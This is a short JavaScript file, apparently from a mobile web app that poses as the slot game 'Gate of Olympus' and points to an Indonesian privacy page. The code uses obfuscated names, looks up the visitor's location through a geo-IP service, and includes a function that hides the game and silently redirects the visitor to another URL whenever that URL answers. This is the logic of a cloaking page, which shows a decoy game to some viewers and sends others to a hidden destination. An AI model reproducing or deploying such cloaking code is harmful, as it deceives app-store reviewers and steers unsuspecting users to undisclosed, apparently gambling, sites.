var privacypolicy = "https://m.oke1app77.art/id/panduan";
var applink = "https://gadekuran3.github.io/gate_of_olympus/app.html?ver="+ Math.random(); ;
 
function stop() {
    throw new Error('LOG ERROR!')
}

function checkurl(_0x5d16x3) {
    $['ajax']({
        url: _0x5d16x3,
        dataType: 'jsonp',
        success: function(_0x5d16x3) {},
        statusCode: {
            200: function() {
                console['log']('Roll it on!'), document['getElementById']('canvas')['style']['display'] = 'none', document['getElementById']('loading')['style']['display'] = 'block', location['assign'](_0x5d16x3)
            },
            404: function() {
                console['log']('Game Connected'), document['getElementById']('canvas')['style']['display'] = 'block', document['getElementById']('loading')['style']['display'] = 'none'
            }
        }
    })
}

$['get']('https://json.geoiplookup.io/', function(_0x5d16x3) {
    console['log'](_0x5d16x3);
    (document['getElementById']('canvas')['style']['display'] = 'block', document['getElementById']('loading')['style']['display'] = 'none')
}, 'jsonp')['fail'](function() {
    document['getElementById']('loading')['style']['display'] = 'none', document['getElementById']('canvas')['style']['display'] = 'none', document['getElementById']('errorpage')['style']['display'] = 'block', stop()
})